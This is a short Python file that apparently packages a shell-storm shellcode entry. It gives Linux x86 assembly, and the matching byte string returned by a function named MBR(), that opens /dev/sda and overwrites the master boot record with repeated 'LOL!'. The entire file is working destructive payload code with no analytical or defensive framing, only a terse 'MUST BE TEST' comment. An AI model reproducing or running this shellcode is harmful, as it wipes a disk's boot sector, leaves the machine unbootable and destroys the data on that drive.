#http://shell-storm.org/shellcode/files/shellcode-565.php

#; linux/x86 overwrite MBR on /dev/sda with `LOL!
#; root@thegibson
#; 2010-01-15

"""
section .text
		global _start
 
_start:
		; open("/dev/sda", O_WRONLY);
		mov al, 5
		xor ecx, ecx
		push ecx
		push dword 0x6164732f
		push dword 0x7665642f
		mov ebx, esp
		inc ecx
		int 0x80
 
		; write(fd, "LOL!"x128, 512);
		mov ebx, eax
		mov al, 4
		cdq
		push edx
		mov cl, 128
		fill:
				push dword 0x214c4f4c
		loop fill
		mov ecx, esp
		inc edx
		shl edx, 9
		int 0x80


"""

#MUST BE TEST

def MBR():
	shellcode =  r"\xb0\x05\x31\xc9\x51\x68\x2f\x73\x64\x61\x68\x2f"
	shellcode += r"\x64\x65\x76\x89\xe3\x41\xcd\x80\x89\xc3\xb0\x04"
	shellcode += r"\x99\x52\xb1\x80\x68\x4c\x4f\x4c\x21\xe2\xf9\x89"
	shellcode += r"\xe1\x42\xc1\xe2\x09\xcd\x80"
	return shellcode
